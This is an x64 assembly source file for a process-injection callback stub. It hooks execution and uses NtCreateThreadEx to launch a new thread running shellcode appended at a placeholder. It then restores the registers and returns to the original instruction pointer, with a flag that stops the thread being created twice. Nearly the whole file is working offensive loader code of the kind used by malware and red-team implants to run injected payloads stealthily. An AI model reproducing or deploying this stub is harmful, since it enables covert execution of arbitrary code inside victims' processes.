;python bin2cbuffer.py callback.bin callback
use64

mov rdx, 0x7fffffffffff ; address of the global variable flag to check thread creation
mov r8, 0x7fffffffffff ; NtCreateThreadEx
;check if thread never run
cmp byte [rdx], 0
je callback_start

;avoid recursions
jmp restore_execution

;here starts the callback part that runs shellcode, this should run just 1st time
callback_start:
    push r10 ; contains old rip to restore execution
    push rax ; syscall return value

    ; why pushing these registers? -> https://docs.microsoft.com/en-us/cpp/build/x64-calling-convention?view=vs-2019#callercallee-saved-registers
    push rbx
    push rbp
    push rdi
    push rsi
    push rsp
    push r12
    push r13
    push r14
    push r15 

    ;shadow space should be 32 bytes + additional function parameters. Must be 32 also if function parameters are less than 4
    sub rsp, 128

    lea rcx, [rel shellcode_placeholder] ; address of the shellcode to run ???????
    call DisposableHook

    ;restore stack shadow space
    add rsp, 128

    ;restore nonvolatile registers
    pop r15 
    pop r14
    pop r13
    pop r12
    pop rsp
    pop rsi
    pop rdi
    pop rbp
    pop rbx

    ;restore the return value
    pop rax

    ;restore old rip
    pop r10

restore_execution:
    jmp r10


;source DisposableHook.c -> DisposableHook.msvc.asm
DisposableHook:
    

    ; 36   : void DisposableHook(LPVOID shellcodeAddr, char *threadCreated) {
    mov QWORD [rsp+24], r8
    mov QWORD [rsp+16], rdx
    mov QWORD [rsp+8], rcx
    push rdi
    sub rsp, 160                ; 000000a0H
    status equ 96 ;0x5b|91
    tHandle equ 104;0x5d
    objAttr equ 112;0x5f
    shellcodeAddr equ 176;0x61
    threadCreated equ 184;0x63
; 37   :    NTSTATUS status;
; 38   :    HANDLE tHandle = NULL;
;;dd
    mov QWORD [rsp+tHandle], 0

; 39   :    OBJECT_ATTRIBUTES objAttr = { sizeof(objAttr) };

    mov DWORD [rsp+objAttr], 48     ; 00000030H
    lea rax, QWORD [rsp+objAttr+8]
    mov rdi, rax
    xor eax, eax
    mov ecx, 40                 ; 00000028H
    rep stosb

; 40   : 
; 41   :    if (InterlockedExchange8((CHAR*)threadCreated, 1) == 1) //avoid recursion + check if another thread already run DisposableHook function
;we manmly change to InterlockedExchange64!
    mov eax, 1
    mov rcx, QWORD [rsp+threadCreated]
    xchg QWORD [rcx], rax; no movsx eax, al
    cmp eax, 1
    jne SHORT LN2_Disposable

; 42   :        return;

    jmp SHORT LN1_Disposable
LN2_Disposable:

; 43   :    status = NtCreateThreadEx(&tHandle, GENERIC_EXECUTE, &objAttr, (HANDLE)-1, (LPVOID)shellcodeAddr, NULL, FALSE, 0, 0, 0, NULL);

    mov QWORD [rsp+80], 0
    mov DWORD [rsp+72], 0
    mov DWORD [rsp+64], 0
    mov DWORD [rsp+56], 0
    mov DWORD [rsp+48], 0
    mov QWORD [rsp+40], 0
    mov rax, QWORD [rsp+shellcodeAddr]
    mov QWORD [rsp+32], rax
    mov r9, -1
    lea r8, QWORD [rsp+objAttr]
    mov rdx, 0x001fffff; THREAD_ALL_ACCESS 20000000H mov edx, 536870912
    lea rcx, QWORD [rsp+tHandle]
    mov rax, QWORD [rsp+192]
    call rax
    mov DWORD [rsp+status], eax

; 44   :    if (status != 0)

    cmp DWORD [rsp+status], 0
    je SHORT LN3_Disposable

; 45   :        InterlockedExchange8((CHAR*)threadCreated, 0); //thread creation failed, reset flag

    xor eax, eax
    mov rcx, QWORD [rsp+threadCreated]
    xchg QWORD [rcx], rax;InterlockedExchange64
LN3_Disposable:
LN1_Disposable:

; 46   : }

    add rsp, 160                ; 000000a0H
    pop rdi
    ret;ret 0
;from here will be appended the shellcode
shellcode_placeholder:
